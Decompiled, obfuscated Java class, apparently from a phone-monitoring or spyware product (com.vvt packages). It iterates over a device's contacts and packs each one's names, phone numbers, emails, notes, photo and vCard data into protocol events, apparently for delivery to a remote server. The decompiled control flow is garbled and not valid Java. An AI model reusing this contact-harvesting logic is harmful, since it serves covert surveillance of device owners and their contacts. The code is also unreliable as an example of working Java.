package com.vvt.addressbookmanager.delivery;

import android.content.Context;
import com.vvt.addressbookmanager.d;
import com.vvt.ag.b;
import com.vvt.base.FxAddressbookMode;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.phoenix.prot.command.e;
import com.vvt.phoenix.prot.event.s;
import java.util.ArrayList;
import java.util.List;

public class a
  implements e
{
  private static final boolean a = d.a;
  private static final boolean b = d.e;
  private List c;
  private int d;
  private FxAddressbookMode e;
  private Context f;
  private boolean g;
  
  public a(List paramList, com.vvt.addressbookmanager.c.a parama, FxAddressbookMode paramFxAddressbookMode, Context paramContext, boolean paramBoolean)
  {
    this.f = paramContext;
    this.e = paramFxAddressbookMode;
    this.d = 0;
    this.c = paramList;
    this.g = paramBoolean;
  }
  
  public boolean a()
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    int i = this.d;
    List localList = this.c;
    int k = localList.size();
    if (i < k) {}
    int j;
    for (i = 1;; j = 0) {
      return i;
    }
  }
  
  public Object b()
  {
    int i = a;
    if (i != 0) {}
    int j = 0;
    Object localObject1 = null;
    for (;;)
    {
      try
      {
        Object localObject2 = this.c;
        int k = this.d;
        localObject2 = ((List)localObject2).get(k);
        localObject2 = (c)localObject2;
        boolean bool2 = a;
        if (bool2) {}
        bool2 = this.g;
        long l1;
        Object localObject5;
        Object localObject6;
        if (bool2)
        {
          l1 = ((c)localObject2).a();
          bool2 = true;
          localObject5 = com.vvt.addressbookmanager.b.a.a.a(l1, bool2);
          localObject6 = localObject5;
          bool2 = ((FxAddressBookEvent)localObject6).isValidContact();
          boolean bool4 = a;
          if ((bool4) && (!bool2)) {
            continue;
          }
          localObject5 = new com/vvt/phoenix/prot/event/s;
          ((s)localObject5).<init>();
        }
        try
        {
          long l2 = ((c)localObject2).c();
          localObject1 = String.valueOf(l2);
          ((s)localObject5).a((String)localObject1);
          l2 = ((c)localObject2).b();
          ((s)localObject5).a(l2);
          localObject2 = ((FxAddressBookEvent)localObject6).getFirstName();
          ((s)localObject5).b((String)localObject2);
          localObject2 = ((FxAddressBookEvent)localObject6).getLastName();
          ((s)localObject5).c((String)localObject2);
          localObject2 = ((FxAddressBookEvent)localObject6).getMobilePhones();
          j = ((ArrayList)localObject2).size();
          if (j > 0)
          {
            j = 0;
            localObject1 = null;
            localObject2 = ((ArrayList)localObject2).get(0);
            localObject2 = (String)localObject2;
            ((s)localObject5).e((String)localObject2);
          }
          localObject2 = ((FxAddressBookEvent)localObject6).getHomePhones();
          j = ((ArrayList)localObject2).size();
          if (j > 0)
          {
            j = 0;
            localObject1 = null;
            localObject2 = ((ArrayList)localObject2).get(0);
            localObject2 = (String)localObject2;
            ((s)localObject5).d((String)localObject2);
          }
          localObject2 = ((FxAddressBookEvent)localObject6).getWorkPhones();
          j = ((ArrayList)localObject2).size();
          if (j > 0)
          {
            j = 0;
            localObject1 = null;
            localObject2 = ((ArrayList)localObject2).get(0);
            localObject2 = (String)localObject2;
            ((s)localObject5).f((String)localObject2);
          }
          localObject2 = ((FxAddressBookEvent)localObject6).getHomeEMail();
          i = b.a((String)localObject2);
          if (i == 0)
          {
            localObject2 = ((FxAddressBookEvent)localObject6).getHomeEMail();
            ((s)localObject5).g((String)localObject2);
          }
          localObject2 = ((FxAddressBookEvent)localObject6).getWorkEMail();
          i = b.a((String)localObject2);
          if (i == 0)
          {
            localObject2 = ((FxAddressBookEvent)localObject6).getWorkEMail();
            ((s)localObject5).g((String)localObject2);
          }
          localObject2 = ((FxAddressBookEvent)localObject6).getOtherEMail();
          i = b.a((String)localObject2);
          if (i == 0)
          {
            localObject2 = ((FxAddressBookEvent)localObject6).getOtherEMail();
            ((s)localObject5).g((String)localObject2);
          }
          localObject2 = this.e;
          localObject1 = FxAddressbookMode.RESTRICTED;
          if (localObject2 == localObject1)
          {
            i = 1;
            ((s)localObject5).a(i);
            localObject2 = ((FxAddressBookEvent)localObject6).getNote();
            ((s)localObject5).h((String)localObject2);
            localObject2 = ((FxAddressBookEvent)localObject6).getContactPicture();
            ((s)localObject5).a((byte[])localObject2);
            localObject2 = ((FxAddressBookEvent)localObject6).getVCardData();
            ((s)localObject5).b((byte[])localObject2);
            bool1 = a;
            if (bool1) {}
            localObject2 = localObject5;
            int m = this.d + 1;
            this.d = m;
            return localObject2;
            l1 = ((c)localObject2).a();
            localObject5 = this.f;
            boolean bool5 = true;
            localObject5 = com.vvt.addressbookmanager.b.b.c.a(l1, (Context)localObject5, bool5);
            localObject6 = localObject5;
            continue;
          }
          bool1 = false;
          localObject2 = null;
          ((s)localObject5).a(0);
          continue;
          bool3 = b;
        }
        catch (Exception localException1)
        {
          localObject3 = localObject5;
        }
      }
      catch (Exception localException2)
      {
        Object localObject3;
        boolean bool3;
        boolean bool1 = false;
        Object localObject4 = null;
        continue;
      }
      if (bool3)
      {
        continue;
        bool1 = a;
        if (bool1) {}
        bool1 = false;
        localObject3 = null;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/delivery/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */